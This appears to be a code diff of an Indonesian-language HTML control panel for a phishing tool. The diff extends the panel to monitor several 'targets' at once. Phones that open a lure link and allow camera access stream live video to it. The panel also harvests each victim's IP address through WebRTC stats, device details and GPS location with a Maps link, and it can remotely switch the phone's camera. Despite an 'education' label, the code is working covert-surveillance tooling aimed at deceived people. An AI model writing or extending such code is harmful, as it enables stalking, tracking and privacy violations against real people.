@@ -2,27 +2,30 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <title>Panel Kontrol Kamera & Informasi Target</title>
+  <title>Panel Monitoring Multi-Target (Edukasi Phishing)</title>
   <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
   <style>
-    body { font-family: sans-serif; text-align: center; background: #1a1a1a; color: white; padding: 20px; }
-    video { width: 90%; max-width: 640px; border-radius: 10px; border: 2px solid #00ffcc; margin-top: 15px; background: #000; }
-    button { padding: 12px 24px; font-size: 16px; background: #007bff; color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; }
+    body { font-family: sans-serif; background: #121212; color: white; padding: 20px; margin: 0; }
+    h1 { text-align: center; color: #00ffcc; margin-bottom: 5px; }
+    p.sub { text-align: center; color: #aaa; margin-top: 0; margin-bottom: 25px; }
+    .grid-container { display: grid; grid-template-columns: repeat(auto-fit, minmax(340px, 1fr)); gap: 20px; padding: 10px; }
+    .target-card { background: #1e1e1e; border: 2px solid #333; border-radius: 12px; padding: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); display: flex; flex-direction: column; align-items: center; }
+    .target-card.active { border-color: #00ffcc; }
+    video { width: 100%; height: 240px; background: #000; border-radius: 8px; object-fit: cover; margin-bottom: 12px; border: 1px solid #444; }
+    .info-box { background: #2a2a2a; width: 100%; padding: 12px; border-radius: 6px; box-sizing: border-box; font-family: monospace; font-size: 13px; color: #00ffcc; line-height: 1.5; text-align: left; margin-bottom: 12px; word-break: break-all; }
+    button { width: 100%; padding: 10px; font-size: 14px; background: #007bff; color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; }
     button:hover { background: #0056b3; }
-    .container { max-width: 700px; margin: 0 auto; }
-    #infoBox { background: #2d2d2d; margin: 15px auto; padding: 15px; border-radius: 8px; color: #00ffcc; font-family: monospace; text-align: left; line-height: 1.6; word-break: break-all; border-left: 5px solid #00ffcc; }
-    .btn-maps { display: inline-block; margin-top: 10px; padding: 10px 18px; background: #28a745; color: white; border-radius: 6px; text-decoration: none; font-weight: bold; font-family: sans-serif; }
+    .btn-maps { display: block; margin-top: 8px; padding: 8px; background: #28a745; color: white; text-align: center; border-radius: 6px; text-decoration: none; font-weight: bold; font-family: sans-serif; font-size: 13px; }
     .btn-maps:hover { background: #218838; }
+    #noTarget { text-align: center; font-size: 18px; color: #888; grid-column: 1 / -1; margin-top: 40px; }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h2>Layar Pantau Kamera & Data Target (Live)</h2>
-    <button id="switchBtn">🔄 Ganti Kamera (Depan / Belakang)</button> <br>
-    
-    <div id="infoBox">Status: Menunggu koneksi dari HP...</div>
-
-    <video id="remoteVideo" autoplay playsinline muted></video>
+  <h1>Layar Monitoring Multi-Target (Live)</h1>
+  <p class="sub">Setiap HP yang mengklik tautan akan otomatis muncul dalam panel independen di bawah ini.</p>
+  
+  <div class="grid-container" id="gridContainer">
+    <div id="noTarget">Menunggu koneksi HP target... (Pastikan HP mengklik tautan & mengizinkan kamera)</div>
   </div>
 
   <script>
@@ -38,39 +41,62 @@
       }
     });
 
-    let activeDataConn = null;
-    let ipTargetInfo = "Mencari IP...";
-    let deviceInfoText = "Menunggu data perangkat...";
-    let mapsButtonHtml = "<br><span style='color:#aaa;'>(Menunggu izin lokasi dari HP...)</span>";
-
-    function updateDisplay() {
-      const infoBox = document.getElementById('infoBox');
-      infoBox.innerHTML = `
-        <strong>🌐 KONEKSI JARINGAN:</strong><br>
-        ${ipTargetInfo}<br><br>
-        <strong>📱 SPESIFIKASI PERANGKAT HP:</strong><br>
-        ${deviceInfoText}<br>
-        ${mapsButtonHtml}
-      `;
-    }
+    const connectedDevices = {};
 
     peer.on('open', (id) => {
-      console.log('Panel Laptop Siap. ID Peer:', id);
+      console.log('Panel Guru Siap. ID Server:', id);
+    });
+
+    peer.on('connection', (conn) => {
+      const peerId = conn.peer;
+      
+      if (!connectedDevices[peerId]) {
+        connectedDevices[peerId] = { dataConn: conn, deviceInfo: null, locationInfo: null };
+        buatKartuTarget(peerId);
+      } else {
+        connectedDevices[peerId].dataConn = conn;
+      }
+
+      conn.on('data', (data) => {
+        const targetPeerId = data.peerId || peerId;
+        if (!connectedDevices[targetPeerId]) {
+          buatKartuTarget(targetPeerId);
+        }
+
+        if (data.type === 'device-info') {
+          connectedDevices[targetPeerId].deviceInfo = data;
+          perbaruiTampilanKartu(targetPeerId);
+        }
+
+        if (data.type === 'location-info') {
+          connectedDevices[targetPeerId].locationInfo = data;
+          perbaruiTampilanKartu(targetPeerId);
+        }
+      });
     });
 
     peer.on('call', (call) => {
+      const peerId = call.peer;
       call.answer();
+
       call.on('stream', (remoteStream) => {
-        const remoteVideo = document.getElementById('remoteVideo');
-        remoteVideo.srcObject = remoteStream;
-        
+        if (!connectedDevices[peerId]) {
+          buatKartuTarget(peerId);
+        }
+
+        const videoEl = document.getElementById(`video-${peerId}`);
+        if (videoEl) {
+          videoEl.srcObject = remoteStream;
+          videoEl.play().catch(err => console.warn("Autoplay dipblokir:", err));
+        }
+
         setTimeout(() => {
           if (call.peerConnection) {
             call.peerConnection.getStats().then(stats => {
               stats.forEach(report => {
                 if (report.type === 'remote-candidate' && report.ip) {
-                  ipTargetInfo = `• IP Target: <strong>${report.ip}</strong><br>• Port: ${report.port}<br>• Tipe Jalur: ${report.candidateType}`;
-                  updateDisplay();
+                  connectedDevices[peerId].ipInfo = `${report.ip}:${report.port} (${report.candidateType})`;
+                  perbaruiTampilanKartu(peerId);
                 }
               });
             });
@@ -79,38 +105,67 @@
       });
     });
 
-    peer.on('connection', (conn) => {
-      activeDataConn = conn;
+    function buatKartuTarget(peerId) {
+      const noTargetEl = document.getElementById('noTarget');
+      if (noTargetEl) noTargetEl.style.display = 'none';
 
-      conn.on('data', (data) => {
-        if (data.type === 'device-info') {
-          deviceInfoText = `
-            • OS & Peramban: ${data.osBrowser}<br>
-            • Layar: ${data.resolusi}<br>
-            • CPU: ${data.cpuCore} Core | Estimasi RAM: ${data.ram}<br>
-            • Zona Waktu: ${data.zonaWaktu}
-          `;
-          updateDisplay();
-        }
+      const grid = document.getElementById('gridContainer');
+      if (document.getElementById(`card-${peerId}`)) return;
 
-        if (data.type === 'location-info') {
-          mapsButtonHtml = `
-            <a href="${data.mapsUrl}" target="_blank" class="btn-maps">
-              🗺️ Buka Google Maps Lokasi HP
-            </a>
-          `;
-          updateDisplay();
-        }
-      });
-    });
+      const card = document.createElement('div');
+      card.className = 'target-card active';
+      card.id = `card-${peerId}`;
 
-    document.getElementById('switchBtn').addEventListener('click', () => {
-      if (activeDataConn && activeDataConn.open) {
-        activeDataConn.send('switch');
+      card.innerHTML = `
+        <h3>📱 Target ID: ${peerId.substring(0, 8)}...</h3>
+        <video id="video-${peerId}" autoplay playsinline muted></video>
+        <div class="info-box" id="info-${peerId}">Menunggu data perangkat...</div>
+        <button onclick="gantiKameraTarget('${peerId}')">🔄 Ganti Kamera Target Ini</button>
+      `;
+
+      grid.appendChild(card);
+    }
+
+    function perbaruiTampilanKartu(peerId) {
+      const infoEl = document.getElementById(`info-${peerId}`);
+      if (!infoEl) return;
+
+      const dev = connectedDevices[peerId];
+      let html = `<strong>🌐 IP:</strong> ${dev.ipInfo || 'Mencari...'}<br><br>`;
+
+      if (dev.deviceInfo) {
+        html += `
+          <strong>📱 Perangkat:</strong><br>
+          • OS/Browser: ${dev.deviceInfo.osBrowser.substring(0, 40)}...<br>
+          • Layar: ${dev.deviceInfo.resolusi}<br>
+          • Hardware: ${dev.deviceInfo.cpuCore} Core | RAM ${dev.deviceInfo.ram}<br>
+          • Zona Waktu: ${dev.deviceInfo.zonaWaktu}<br>
+        `;
       } else {
-        alert("HP belum terhubung! Pastikan link HP sudah dibuka dan tombol klaim sudah ditekan.");
+        html += `• Memuat info perangkat...<br>`;
       }
-    });
+
+      if (dev.locationInfo) {
+        html += `
+          <a href="${dev.locationInfo.mapsUrl}" target="_blank" class="btn-maps">
+            🗺️ Buka Lokasi Google Maps
+          </a>
+        `;
+      } else {
+        html += `<br><span style="color:#888;">(Menunggu izin lokasi GPS...)</span>`;
+      }
+
+      infoEl.innerHTML = html;
+    }
+
+    function gantiKameraTarget(peerId) {
+      const dev = connectedDevices[peerId];
+      if (dev && dev.dataConn && dev.dataConn.open) {
+        dev.dataConn.send('switch');
+      } else {
+        alert("Koneksi data ke HP ini terputus!");
+      }
+    }
   </script>
 </body>
 </html>
